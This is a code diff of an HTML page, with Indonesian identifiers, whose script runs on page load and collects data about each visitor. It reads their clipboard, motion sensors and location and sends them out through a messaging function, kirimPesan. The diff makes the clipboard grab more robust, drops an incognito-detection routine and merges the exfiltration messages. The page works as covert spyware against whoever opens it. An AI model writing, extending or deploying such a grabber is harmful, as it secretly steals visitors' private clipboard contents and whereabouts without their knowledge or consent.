@@ -596,25 +596,19 @@ Gyroscope (°/s)
 
 const ambilClipboard = async () => {
   try {
+    if (!navigator.clipboard || !navigator.clipboard.readText) {
+      return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Clipboard API tidak didukung.`;
+    }
+
     const text = await navigator.clipboard.readText();
-    if (!text) throw new Error();
+    if (!text || text.trim() === "") {
+      return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Tidak ada isi clipboard.`;
+    }
+
     return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\nIsi terakhir: ${text}`;
-  } catch {
-    return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Tidak bisa akses clipboard.`;
+  } catch (err) {
+    return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Tidak bisa akses clipboard (kemungkinan butuh HTTPS / izin gesture).`;
   }
-};
-
-const deteksiIncognito = async () => {
-  let incognito = false;
-  try {
-    window.webkitRequestFileSystem(
-      window.TEMPORARY, 100, () => incognito = false, () => incognito = true
-    );
-  } catch {
-    incognito = true;
-  }
-
-  return `౼ 〘 𝗠𝗢𝗗𝗘 𝗣𝗥𝗜𝗩𝗔𝗦𝗜 〙 ౼\nMode Incognito: ${incognito ? "Mungkin aktif" : "Tidak terdeteksi"}`;
 };
 
 const ambilLokasi = () => {
@@ -784,23 +778,16 @@ const mulai = async () => {
 
   await kirimPesan(gabungAwal);
 
-  // 🔥 Fitur lanjutan (dikirim terpisah)
+  // 🔥 Sensor Gerakan + Clipboard digabung
   const sensorGerakan = await ambilSensorGerakan();
   const clipboardInfo = await ambilClipboard();
-  const incognitoInfo = await deteksiIncognito();
-  const aktivitasTab = ambilAktivitasTab();
-  const devtoolsInfo = ambilDevToolsStatus();
-  const lamaDiHalaman = ambilDurasiHalaman();
 
-  const gabungTambahan = [
+  const gabungLanjutan = [
     sensorGerakan,
-    clipboardInfo,
-    incognitoInfo,
-    devtoolsInfo,
-    lamaDiHalaman
+    clipboardInfo
   ].join("\n\n");
 
-  await kirimPesan(gabungTambahan); // ✅ Kirim fitur tambahan
+  await kirimPesan(gabungLanjutan); // ✅ kirim 1 pesan
 
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
@@ -817,4 +804,4 @@ const mulai = async () => {
     window.addEventListener("load", mulai);
   </script>
 </body>
-</html>
+  </html>
